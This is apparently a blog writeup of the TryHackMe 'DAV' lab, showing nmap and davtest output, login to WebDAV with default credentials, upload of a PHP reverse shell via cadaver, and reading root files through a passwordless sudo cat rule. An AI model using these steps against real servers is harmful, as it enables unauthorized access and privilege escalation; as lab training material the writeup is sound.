---
layout: post
title: DAV Writeup
date: 2020-09-16 00:00:00 +5:30
categories: [TryHackMe, Easy]
tags: [tryhackme, owasp10, sudo] # add tag
---

## Description

The Following Post is writeup of DAV room of tryhackme <https://tryhackme.com/room/bsidesgtdav>

|Machine|Detail
|:---|:--
|OS | Linux
|Rating | Easy
|Creator | stuxnet

## Summary

The machine have single port open 80. It got default page after dirbust we can see Webdav with default creds.
We can upload and execute php shell. www-data can execute cat as sudo so we can see root.txt.

## Walkthrough

### Enumeration

```bash
┌─[argenestel@parrot]─[~/Desktop/tryhackme/DAV]
└──╼ $nmap -sC -sV 10.10.229.29
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-17 15:20 IST
Nmap scan report for 10.10.229.29
Host is up (0.21s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.23 seconds
```

so from nmap scan we got one port only
Let's see what we can do.

#### port 80

![Webpage](/assets/img/dav/defaultapache.png)

![ffuf](/assets/img/dav/ffufoutput.png)

so we got webdav dir but it requires creds we don't have username  <br />
we can try default creds of webdav (user wampp and password xampp) <br />
okay we got directory listing let's check how we can exploit webdav <br />
so we can upload files using cadaver in webdav<br />
So let's run davtest to see what we can upload

![creds](/assets/img/dav/defaultcreds.png)

```bash
┌─[argenestel@parrot]─[~/Desktop/tryhackme/DAV]
└──╼ $davtest -url http://10.10.229.29/webdav/ -auth wampp:xampp
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.229.29/webdav
********************************************************
NOTE    Random string for this session: s1y0c7
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.10.229.29/webdav/DavTestDir_s1y0c7
********************************************************
 Sending test files
PUT     jsp     SUCCEED:        http://10.10.229.29/webdav/DavTestDir_s1y0c7/davtest_s1y0c7.jsp
PUT     asp     SUCCEED:        http://10.10.229.29/webdav/DavTestDir_s1y0c7/davtest_s1y0c7.asp
PUT     cgi     SUCCEED:        http://10.10.229.29/webdav/DavTestDir_s1y0c7/davtest_s1y0c7.cgi
PUT     jhtml   SUCCEED:        http://10.10.229.29/webdav/DavTestDir_s1y0c7/davtest_s1y0c7.jhtml
PUT     php     SUCCEED:        http://10.10.229.29/webdav/DavTestDir_s1y0c7/davtest_s1y0c7.php
PUT     shtml   SUCCEED:        http://10.10.229.29/webdav/DavTestDir_s1y0c7/davtest_s1y0c7.shtml
PUT     cfm     SUCCEED:        http://10.10.229.29/webdav/DavTestDir_s1y0c7/davtest_s1y0c7.cfm
PUT     pl      SUCCEED:        http://10.10.229.29/webdav/DavTestDir_s1y0c7/davtest_s1y0c7.pl
PUT     html    SUCCEED:        http://10.10.229.29/webdav/DavTestDir_s1y0c7/davtest_s1y0c7.html
PUT     aspx    SUCCEED:        http://10.10.229.29/webdav/DavTestDir_s1y0c7/davtest_s1y0c7.aspx
PUT     txt     SUCCEED:        http://10.10.229.29/webdav/DavTestDir_s1y0c7/davtest_s1y0c7.txt
********************************************************
 Checking for test file execution
EXEC    jsp     FAIL
EXEC    asp     FAIL
EXEC    cgi     FAIL
EXEC    jhtml   FAIL
EXEC    php     SUCCEED:        http://10.10.229.29/webdav/DavTestDir_s1y0c7/davtest_s1y0c7.php
EXEC    shtml   FAIL
EXEC    cfm     FAIL
EXEC    pl      FAIL
EXEC    html    SUCCEED:        http://10.10.229.29/webdav/DavTestDir_s1y0c7/davtest_s1y0c7.html
EXEC    aspx    FAIL
EXEC    txt     SUCCEED:        http://10.10.229.29/webdav/DavTestDir_s1y0c7/davtest_s1y0c7.txt

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.229.29/webdav/DavTestDir_s1y0c7
PUT File: http://10.10.229.29/webdav/DavTestDir_s1y0c7/davtest_s1y0c7.jsp
PUT File: http://10.10.229.29/webdav/DavTestDir_s1y0c7/davtest_s1y0c7.asp
PUT File: http://10.10.229.29/webdav/DavTestDir_s1y0c7/davtest_s1y0c7.cgi
PUT File: http://10.10.229.29/webdav/DavTestDir_s1y0c7/davtest_s1y0c7.jhtml
PUT File: http://10.10.229.29/webdav/DavTestDir_s1y0c7/davtest_s1y0c7.php
PUT File: http://10.10.229.29/webdav/DavTestDir_s1y0c7/davtest_s1y0c7.shtml
PUT File: http://10.10.229.29/webdav/DavTestDir_s1y0c7/davtest_s1y0c7.cfm
PUT File: http://10.10.229.29/webdav/DavTestDir_s1y0c7/davtest_s1y0c7.pl
PUT File: http://10.10.229.29/webdav/DavTestDir_s1y0c7/davtest_s1y0c7.html
PUT File: http://10.10.229.29/webdav/DavTestDir_s1y0c7/davtest_s1y0c7.aspx
PUT File: http://10.10.229.29/webdav/DavTestDir_s1y0c7/davtest_s1y0c7.txt
Executes: http://10.10.229.29/webdav/DavTestDir_s1y0c7/davtest_s1y0c7.php
Executes: http://10.10.229.29/webdav/DavTestDir_s1y0c7/davtest_s1y0c7.html
Executes: http://10.10.229.29/webdav/DavTestDir_s1y0c7/davtest_s1y0c7.txt
```

Php is uploadable and executable.

#### Exploitation

so we are now going to upload a reverse shell.

```bash
┌─[✗]─[argenestel@parrot]─[~/Desktop/tryhackme/DAV]
└──╼ $cadaver http://10.10.229.29/webdav/
Authentication required for webdav on server `10.10.229.29':
Username: xampp
Password:
Authentication required for webdav on server `10.10.229.29':
Username: wampp
Password:
dav:/webdav/> help
Available commands:
 ls         cd         pwd        put        get        mget       mput      
 edit       less       mkcol      cat        delete     rmcol      copy      
 move       lock       unlock     discover   steal      showlocks  version   
 checkin    checkout   uncheckout history    label      propnames  chexec    
 propget    propdel    propset    search     set        open       close     
 echo       quit       unset      lcd        lls        lpwd       logout    
 help       describe   about     
Aliases: rm=delete, mkdir=mkcol, mv=move, cp=copy, more=less, quit=exit=bye
dav:/webdav/> put phpshell.php
Uploading phpshell.php to `/webdav/phpshell.php':
Progress: [=============================>] 100.0% of 5494 bytes succeeded.
dav:/webdav/>
```

uploaded php shell let's execute it

we have pwncat listening.

#### PrivEsc

```bash
sudo -l

[+] Testing 'sudo -l' without password & /etc/sudoers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat

sudo cat /root/root.txt
```
Hmmm we can read root.txt using sudo
and we get the root file.

### Reviews

Easy Machine everything is straight forward. I stuck at webdav login but turns out to be default.
